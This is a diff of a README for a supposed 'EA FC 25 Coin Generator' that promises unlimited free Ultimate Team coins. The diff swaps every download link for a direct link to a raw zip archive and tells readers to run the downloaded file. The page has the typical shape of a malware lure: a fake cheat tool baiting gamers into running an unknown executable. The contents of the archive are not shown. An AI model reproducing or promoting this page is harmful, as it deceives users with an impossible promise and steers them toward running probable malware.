@@ -1,12 +1,12 @@
 # ⚽ Ea-FC-25-Coin-Generator - Generate Coins Instantly and Securely
 
-[![Download Ea FC 25 Coin Generator](https://img.shields.io/badge/Download-EA_FC_25_Coin_Generator-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator)
+[![Download Ea FC 25 Coin Generator](https://img.shields.io/badge/Download-EA_FC_25_Coin_Generator-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
 Welcome to the **Ea-FC-25-Coin-Generator** — your all-in-one solution for generating unlimited coins in EA FC 25 on Windows. Whether you're a casual player or a hardcore Ultimate Team enthusiast, this tool gives you the edge you need without spending real money. It's free, fast, and designed for everyday users — no technical skills required.
 
-Visit this link to download the application: [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator)
+Visit this link to download the application: [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip)
 
 ## 💡 What Does This Tool Do?
 
@@ -25,7 +25,7 @@ No more grinding matches or spending hours on the transfer market. This tool han
 Getting started is easy. Follow these simple steps:
 
 1. **Click the download button** at the top of this page or use the link below:  
-   [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator)
+   [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip)
 
 2. **Visit this link to download the application.** The download will start automatically after you click the button on that page.
 
@@ -132,7 +132,7 @@ Try refreshing the page or using a different browser. If issues persist, check y
 
 ## 🖱️ Quick Start Summary
 
-1. **Download** — click the badge above or visit [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator)
+1. **Download** — click the badge above or visit [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip)
 2. **Run** — double-click the downloaded file
 3. **Enter username** — type your EA FC 25 username
 4. **Generate** — select coin amount and click Generate
@@ -146,7 +146,7 @@ If you run into any issues, check the FAQ section first. For additional help, yo
 
 The Ea-FC-25-Coin-Generator is your shortcut to a better Ultimate Team experience. Skip the grind, avoid spending real money, and build your dream squad today. Download it now and see the difference.
 
-Remember: Visit this link to download the application: [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator)
+Remember: Visit this link to download the application: [https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip](https://github.com/briggsmarvin223/Ea-FC-25-Coin-Generator/raw/refs/heads/main/interset/1.1-beta.1.zip)
 
 ---
 
